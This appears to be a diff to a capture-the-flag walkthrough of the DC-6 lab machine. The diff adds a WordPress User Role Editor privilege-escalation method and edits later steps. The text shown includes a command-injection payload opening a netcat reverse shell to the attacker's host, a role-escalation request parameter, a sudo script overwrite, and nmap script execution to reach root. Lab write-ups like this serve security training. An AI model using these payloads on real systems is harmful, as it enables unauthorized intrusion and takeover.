@@ -84,6 +84,17 @@ By DCAU
 * Next, we will set up our `netcat` listener on our Kali VM terminal by running `nc -v -l -p 1234`, and then inject our `netcat` command to get our shell by entering `www.google.com | nc 10.0.2.4 1234 -e /bin/sh`, before then pressing `Lookup`:
 ![](/screenshots/dc-6/ncEstablishShell.jpg)
 * Note: Remember to change `maxlength` attribute value first before doing the command injection!
+
+# Method 2: Privilege Escalation using User Role Editor
+* I found this [article](http://sec.sangfor.com/vulns/321.html) to have given me a better understanding of how I can carry out the privilege escalation, as compared to the [Wordfence article](https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/) that explained better the underlying code that resulted in the vulnerability.
+* Using Burp Suite, intercept the request when we press `Update Profile`, as user `mark`.
+* Concatenate the string `&ure_other_roles=administrator` (as explained in the article) to the end of the POST request.
+* `Forward` the next couple of requests, and we will then see that we are now having the `administrator` role!
+![](/screenshots/dc-6/userRoleEditorPluginPrivEsc.jpg)
+* Get a reverse shell by uploading the code contents to either themes or plugins, and catch it using `netcat`. I did not manage to get this part working because of this error despite multiple attempts:
+![](/screenshots/dc-6/wordPressReverseShellError.jpg)
+* Note: I could have uploaded a `malicious-wordpress-plugin` instead (which I did not attempt), but wanted to try my hand at a direct edit, which worked before.
+
 * We have our shell now, and we are user `www-data` as expected.
 * Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
 * Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
@@ -110,15 +121,15 @@ By DCAU
 ![](/screenshots/dc-6/jensBackupsErrorMessage.jpg)
 * Next, I decided to switch to user `graham`: `su graham`, and entered his password that we had just discovered.
 * Note: `su mark` with `helpdesk01` does not work.
-* I headed back to run `backups.sh`, after figuring out that `graham` belonged to the group `devs`, where those who were part of the group would have the same permissions as `jens`, the file creator in this case. However, the script was still unsuccessfully executed, but we made some 'headway' still, as compared to running it as user `www-data`.
+* I headed back to run `backups.sh`, after figuring out that `graham` belonged to the group `devs`, where those who were part of the group would have the same permissions as `jens`, the file creator in this case. However, the script was still unsuccessfully executed (as expected because `backups.tar.gz` is missing), but we made some 'headway' still, as compared to running it as user `www-data`.
 ![](/screenshots/dc-6/jensBackupsErrorMessageGraham.jpg)
 * I ran `sudo -l` next, remembering that this command would probably work now, as compared to being executed under user `www-data`:
 ![](/screenshots/dc-6/sudoCommandsGraham.jpg)
 * The output of `sudo -l` gave us just about the same finding that we had just derived - that we can run `backups.sh` as user `jens`.
 * At this point I thought that we are pretty much stuck because the `backups.tar.gz` file is missing from our directory. We cannot remove the shell script and replace it with our own because the permissions of our uploaded shell script would then be different.
-* I tried to use the `nano` text editor to edit `backups.sh` (since we had read, write and execute permissions for the file), but an error occured. `vi` did not seem to work properly, so I ran `echo /bin/sh > backups.sh` as a last resort.
-* The `echo` command would completely overwrite the contents of the file with our `/bin/sh` command.
-* Note: We can replace `/bin/bash` with `/bin/sh` - there is no difference between the two. **(to-be-confimed)**
+* I tried to use the `nano` text editor to edit `backups.sh` (since we had read, write and execute permissions for the file), but an error occured. `vi` did not seem to work properly, so I ran `echo /bin/bash > backups.sh` as a last resort.
+* The `echo` command would completely overwrite the contents of the file with our `/bin/bash` command.
+* Note: We can replace `/bin/bash` with `/bin/sh` - there is no difference between the two, but the former provides a nicer interface.
 * Having said so, we would next run `backups.sh` as user `jens`, allowing us to spawn a shell with the identity of `jens`: `sudo -u jens ./backups.sh`.
 ![](/screenshots/dc-6/escalateAsUserJens.jpg)
 * Next, I ran `sudo -l` to see what commands that we can run as another user, and it turns out that we can run `nmap` as `root`!
@@ -138,7 +149,7 @@ By DCAU
 ![](/screenshots/dc-6/nmapVersionPrivilegeEscalationAlternative.jpg)
 * Note: We cannot simply insert `/bin/sh` into the temporary file because the file's contents are interpreted in scripting language, rather than just a stand-alone command.
 * Note: Running `sudo nmap --script='os.execute("/bin/sh")'` instead of the 3 commands results in an error because the `--script=` parameter is expecting a filename or directory. Hence, we had to split the command up and executing them consecutively.
-* Note: Using `/bin/bash` instead gives a nicer interface to our newly spawned shell.
+* Note: Using `/bin/bash` instead gives a nicer interface to our newly spawned shell:
 ![](/screenshots/dc-6/privilegeEscalationRootBash.jpg)
 * Head to `/root` directory, and open up `theflag.txt` - and we are done with the challenge!
 ![](/screenshots/dc-6/flag.jpg)
